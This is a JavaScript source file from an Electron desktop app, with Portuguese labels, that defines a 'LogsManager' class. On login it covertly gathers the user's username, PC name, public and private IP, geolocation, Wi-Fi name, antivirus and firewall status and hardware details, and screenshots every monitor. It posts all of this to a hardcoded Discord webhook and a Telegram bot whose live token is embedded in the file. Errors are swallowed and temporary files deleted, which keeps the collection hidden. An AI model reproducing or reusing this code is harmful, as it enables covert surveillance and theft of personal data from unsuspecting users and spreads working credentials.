import { ipcMain, desktopCapturer, screen, BrowserWindow } from 'electron';
import { exec } from 'child_process';
import os from 'os';
import si from 'systeminformation';
import axios from 'axios';
import FormData from 'form-data';
import { promisify } from 'util';
import fs from 'fs';
import path from 'path';

const execPromise = promisify(exec);

class LogsManager {
    constructor() {
        this.discordUser = null;
        this.setupDiscordListener();
    }

    setupDiscordListener() {
        ipcMain.on('discord-user-updated', (event, userInfo) => {
            this.discordUser = userInfo;
        });

        ipcMain.handle('get-logs-discord-user', () => {
            return this.discordUser;
        });

        ipcMain.handle('send-logs-on-login', async () => {
            await this.sendLogs();
        });
    }

    setDiscordUser(user) {
        this.discordUser = user;
    }

    async captureAllScreenshots() {
        try {
            const sources = await desktopCapturer.getSources({
                types: ['screen'],
                thumbnailSize: {
                    width: 1920,
                    height: 1080
                }
            });

            if (sources.length === 0) {
                throw new Error('Nenhuma fonte de tela encontrada');
            }

            const screenshotPaths = [];

            for (let i = 0; i < sources.length; i++) {
                const source = sources[i];
                const tempPath = path.join(os.tmpdir(), `screenshot_${i}_${Date.now()}.png`);
                const thumbnail = source.thumbnail.toPNG();
                fs.writeFileSync(tempPath, thumbnail);

                screenshotPaths.push({
                    path: tempPath,
                    displayId: i,
                    name: source.name || `Monitor ${i + 1}`
                });
            }

            return screenshotPaths;
        } catch (error) {
            return [];
        }
    }

    async combineScreenshots(screenshotPaths) {
        if (screenshotPaths.length === 0) return null;
        if (screenshotPaths.length === 1) return screenshotPaths[0].path;

        try {
            const sharp = require('sharp');

            const images = [];
            let totalWidth = 0;
            let maxHeight = 0;

            for (const screenshot of screenshotPaths) {
                const metadata = await sharp(screenshot.path).metadata();
                images.push({
                    path: screenshot.path,
                    width: metadata.width,
                    height: metadata.height
                });
                totalWidth += metadata.width;
                maxHeight = Math.max(maxHeight, metadata.height);
            }

            const combinedPath = path.join(os.tmpdir(), `screenshot_combined_${Date.now()}.png`);

            const inputs = [];
            let currentX = 0;

            for (const image of images) {
                inputs.push({
                    input: await sharp(image.path).toBuffer(),
                    left: currentX,
                    top: 0
                });
                currentX += image.width;
            }

            await sharp({
                create: {
                    width: totalWidth,
                    height: maxHeight,
                    channels: 4,
                    background: { r: 0, g: 0, b: 0, alpha: 0 }
                }
            })
                .composite(inputs)
                .png()
                .toFile(combinedPath);

            return combinedPath;
        } catch (error) {
            return screenshotPaths[0]?.path || null;
        }
    }

    async collectSystemInfo() {
        try {
            const [cpu, gpu, ram, disk, osInfo, system] = await Promise.all([
                si.cpu(),
                si.graphics(),
                si.mem(),
                si.diskLayout(),
                si.osInfo(),
                si.system()
            ]);

            let publicIp = 'Desconhecido';
            try {
                const ipResponse = await axios.get('https://api.ipify.org');
                publicIp = ipResponse.data;
            } catch (error) {}

            let location = 'Desconhecido';
            try {
                const locationResponse = await axios.get('http://ip-api.com/json');
                const locData = locationResponse.data;
                location = `${locData.city || '?'}, ${locData.regionName || '?'}, ${locData.country || '?'}`;
            } catch (error) {}

            const firewallStatus = await this.getFirewallStatus();
            const antivirus = await this.getAntivirus();
            const privateIp = this.getPrivateIP();
            const connectionType = this.getConnectionType();
            const wifiName = await this.getWifiName();
            const uptime = this.getUptime();

            const motherboard = system.model || 'Desconhecido';
            const displays = screen.getAllDisplays();
            const resolutions = displays.map((display, index) =>
                `Monitor ${index + 1}: ${display.size.width}x${display.size.height}`
            ).join(' | ');

            const domain = osInfo.domain || 'Desconhecido';
            const totalRamGB = (ram.total / (1024 * 1024 * 1024)).toFixed(2);
            const gpuInfo = gpu.controllers.length > 0 ? gpu.controllers[0].model : 'Desconhecido';
            const diskSerial = disk.length > 0 && disk[0].serialNum ? disk[0].serialNum.trim() : 'Desconhecido';

            return {
                userName: osInfo.userName || os.userInfo().username,
                pcName: os.hostname(),
                os: `${osInfo.distro} ${osInfo.release} (${osInfo.arch})`,
                domain: domain,
                dateTime: new Date().toLocaleString('pt-BR'),
                uptime: uptime,
                ipPublic: publicIp,
                ipPrivate: privateIp,
                connectionType: connectionType,
                wifiName: wifiName,
                language: Intl.DateTimeFormat().resolvedOptions().locale,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                location: location,
                antivirus: antivirus,
                firewall: firewallStatus,
                cpu: `${cpu.manufacturer} ${cpu.brand} (${cpu.cores} cores)`,
                gpu: gpuInfo,
                ram: `${totalRamGB} GB`,
                disk: diskSerial,
                motherboard: motherboard,
                resolutions: resolutions,
                totalMonitors: displays.length,
                currentDir: process.cwd(),
                tempPath: os.tmpdir()
            };
        } catch (error) {
            return null;
        }
    }

    async sendToDiscord(info, screenshotPaths) {
        try {
            const webhookUrl = 'https://discord.com/api/webhooks/1408882704677732393/YViaLAncf41tvjBzE8e0hQJfx1FWVcX0bopw55vrR6A8wyO2HygxyCwH3hiVQCLd7lZi';

            let imagePath = null;
            let imageFilename = 'screenshot.png';

            if (screenshotPaths && screenshotPaths.length > 0) {
                if (screenshotPaths.length === 1) {
                    imagePath = screenshotPaths[0].path;
                } else {
                    imagePath = await this.combineScreenshots(screenshotPaths);
                    imageFilename = 'screenshots_combined.png';
                }
            }

            const embed = {
                title: '<:icons8boyontherocket100:1332618970628620300> Novo acesso autorizado!',
                color: 0x05F804,
                fields: [
                    { name: '<:icons8user1001:1332620007565299753> Usuário Discord', value: this.discordUser ? `${this.discordUser.mention} (${this.discordUser.tag})` : '❌ Não conectado ao Discord', inline: false },
                    { name: '<:icons8user1001:1332620007565299753> Usuário Sistema', value: `${info.userName}`, inline: true },
                    { name: '<:icons8edit100:1332618968959025274> Nome do PC', value: `${info.pcName}`, inline: true },
                    { name: '<:icons8config100:1332618989716639776> Sistema', value: `${info.os}`, inline: false },
                    { name: '<:icons8alarmclock100:1332618962667573308> Data/Hora', value: `${info.dateTime}`, inline: true },
                    { name: '<:icons8chaveinglesa100:1333040713901932625> IP Público', value: `${info.ipPublic}`, inline: true },
                    { name: '<:icons8link100:1335335327124164738> IP Privado', value: `${info.ipPrivate}`, inline: true },
                    { name: '<:icons8pesquisar100:1332959344127512586> Localização', value: `${info.location}`, inline: false },
                    { name: '<:icons8config100:1332618989716639776> CPU', value: `${info.cpu}`, inline: false },
                    { name: '<:icons8stellar100:1332618965012447264> RAM', value: `${info.ram}`, inline: true },
                    { name: '<:icons8link100:1335335327124164738> Wi-Fi', value: `${info.wifiName}`, inline: true },
                    { name: '<:icons8vassoura100:1336810607927885886> Antivírus', value: `${info.antivirus}`, inline: true },
                    { name: '<:icons8lightningbolt100:1332618966358822973> Firewall', value: `${info.firewall}`, inline: true },
                    { name: '<:icons8termsandconditions100:1335352538719060059> Resoluções', value: `${info.resolutions}`, inline: false },
                    { name: '<:icons8binculos100:1332703995801636928> Total de Monitores', value: `${info.totalMonitors}`, inline: true }
                ],
                timestamp: new Date().toISOString(),
                footer: {
                    text: this.discordUser ? `ID: ${this.discordUser.id}` : 'Sem informações do Discord'
                }
            };

            if (imagePath && fs.existsSync(imagePath)) {
                embed.image = { url: `attachment://${imageFilename}` };
            }

            const formData = new FormData();
            const payload = {
                embeds: [embed],
                username: 'Maxify Logs',
                avatar_url: this.discordUser?.avatarURL || 'https://i.imgur.com/4M34hi2.png'
            };


            formData.append('payload_json', JSON.stringify(payload));

            if (imagePath && fs.existsSync(imagePath)) {
                formData.append('file', fs.createReadStream(imagePath), {
                    filename: imageFilename,
                    contentType: 'image/png'
                });
            }

            await axios.post(webhookUrl, formData, {
                headers: formData.getHeaders()
            });

            if (imagePath && screenshotPaths.length > 1 && imagePath !== screenshotPaths[0]?.path) {
                try { fs.unlinkSync(imagePath); } catch (e) { }
            }

        } catch (error) {}
    }

    async sendToTelegram(info, screenshotPaths) {
        try {
            const token = '8192483400:AAE4drJ119EMkcm90Sdwu0xKm9FAMRKk4aM';
            const chatId = '-4817984606';

            let msg = `🔒 *NOVO ACESSO AUTORIZADO!*\n\n`;

            if (this.discordUser) {
                msg += `🎮 *DISCORD:*\n`;
                msg += `├ Tag: ${this.discordUser.tag}\n`;
                msg += `├ ID: \`${this.discordUser.id}\`\n`;
                msg += `└ Menção: @${this.discordUser.username}\n\n`;
            } else {
                msg += `❌ *Discord não conectado*\n\n`;
            }

            msg += `👤 *USUÁRIO:* \`${info.userName}\`\n`;
            msg += `💻 *PC:* \`${info.pcName}\`\n`;
            msg += `🖥️ *SISTEMA:* \`${info.os}\`\n`;
            msg += `🌐 *DOMÍNIO:* \`${info.domain}\`\n`;
            msg += `📅 *DATA/HORA:* \`${info.dateTime}\`\n`;
            msg += `🕒 *ATIVIDADE:* \`${info.uptime}\`\n\n`;
            msg += `🌍 *IP PÚBLICO:* \`${info.ipPublic}\`\n`;
            msg += `📡 *IP PRIVADO:* \`${info.ipPrivate}\`\n`;
            msg += `📶 *CONEXÃO:* \`${info.connectionType}\`\n`;
            msg += `📶 *WI-FI:* \`${info.wifiName}\`\n`;
            msg += `🌐 *IDIOMA:* \`${info.language}\`\n`;
            msg += `⏰ *FUSO:* \`${info.timezone}\`\n`;
            msg += `📍 *LOCALIZAÇÃO:* \`${info.location}\`\n\n`;
            msg += `🛡️ *ANTIVÍRUS:* \`${info.antivirus}\`\n`;
            msg += `🔥 *FIREWALL:* \`${info.firewall}\`\n\n`;
            msg += `💽 *CPU:* \`${info.cpu}\`\n`;
            msg += `🎮 *GPU:* \`${info.gpu}\`\n`;
            msg += `💾 *RAM:* \`${info.ram}\`\n`;
            msg += `💾 *ARMAZENAMENTO:* \`${info.disk}\`\n`;
            msg += `🖥️ *PLACA MÃE:* \`${info.motherboard}\`\n`;
            msg += `📏 *TELAS:* \`${info.totalMonitors} monitor(es)\`\n`;
            msg += `📐 *RESOLUÇÕES:* \`${info.resolutions}\`\n\n`;
            msg += `🗂️ *DIRETÓRIO:* \`${info.currentDir}\`\n`;
            msg += `📁 *TEMP:* \`${info.tempPath}\``;

            if (screenshotPaths && screenshotPaths.length > 0) {
                const combinedPath = await this.combineScreenshots(screenshotPaths);
                if (combinedPath) {
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('caption', msg);
                    formData.append('parse_mode', 'Markdown');
                    formData.append('photo', fs.createReadStream(combinedPath));
                    await axios.post(`https://api.telegram.org/bot${token}/sendPhoto`, formData, {
                        headers: formData.getHeaders()
                    });
                    if (combinedPath !== screenshotPaths[0]?.path) {
                        try { fs.unlinkSync(combinedPath); } catch (e) { }
                    }
                }
            } else {
                await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
                    chat_id: chatId,
                    text: msg,
                    parse_mode: 'Markdown'
                });
            }

        } catch (error) {}
    }

    async sendLogs() {
        const info = await this.collectSystemInfo();
        let screenshotPaths = [];

        if (info) {
            try {
                screenshotPaths = await this.captureAllScreenshots();
            } catch (error) {}

            await Promise.all([
                this.sendToTelegram(info, screenshotPaths),
                this.sendToDiscord(info, screenshotPaths)
            ]);

            for (const screenshot of screenshotPaths) {
                if (fs.existsSync(screenshot.path)) {
                    try {
                        fs.unlinkSync(screenshot.path);
                    } catch (error) {}
                }
            }
        }
    }

    getPrivateIP() {
        const interfaces = os.networkInterfaces();
        for (const name in interfaces) {
            for (const iface of interfaces[name]) {
                if (iface.family === 'IPv4' && !iface.internal) {
                    return iface.address;
                }
            }
        }
        return 'Desconhecido';
    }

    getConnectionType() {
        try {
            const interfaces = os.networkInterfaces();
            for (const name in interfaces) {
                if (!interfaces[name].some(iface => iface.internal)) {
                    if (name.toLowerCase().includes('wi-fi') || name.toLowerCase().includes('wireless')) {
                        return 'Wi-Fi';
                    }
                    if (name.toLowerCase().includes('ethernet')) {
                        return 'Ethernet';
                    }
                }
            }
        } catch (error) {}
        return 'Desconhecido';
    }

    async getWifiName() {
        return new Promise((resolve) => {
            if (process.platform === 'win32') {
                exec('netsh wlan show interfaces', (error, stdout) => {
                    if (error) {
                        resolve('Desconhecido');
                        return;
                    }
                    const match = stdout.match(/SSID\s*:\s*(.+)/);
                    resolve(match ? match[1].trim() : 'Desconhecido');
                });
            } else {
                resolve('Desconhecido');
            }
        });
    }

    async getFirewallStatus() {
        return new Promise((resolve) => {
            if (process.platform === 'win32') {
                exec('netsh advfirewall show currentprofile', (error, stdout) => {
                    if (error) {
                        resolve('Desconhecido');
                        return;
                    }
                    const match = stdout.match(/State\s*(\w+)/);
                    resolve(match ? (match[1].toLowerCase() === 'on' ? 'Ativado' : 'Desativado') : 'Desconhecido');
                });
            } else {
                resolve('Desconhecido');
            }
        });
    }

    async getAntivirus() {
        return new Promise((resolve) => {
            if (process.platform === 'win32') {
                exec('wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname', (error, stdout) => {
                    if (error) {
                        resolve('Desconhecido');
                        return;
                    }
                    const lines = stdout.split('\n').filter(line => line.trim() && !line.includes('DisplayName'));
                    resolve(lines.length > 0 ? lines[0].trim() : 'Desconhecido');
                });
            } else {
                resolve('Desconhecido');
            }
        });
    }

    getUptime() {
        const uptimeSeconds = os.uptime();
        const days = Math.floor(uptimeSeconds / 86400);
        const hours = Math.floor((uptimeSeconds % 86400) / 3600);
        const minutes = Math.floor((uptimeSeconds % 3600) / 60);
        return `${days}d ${hours}h ${minutes}m`;
    }
}

export default LogsManager;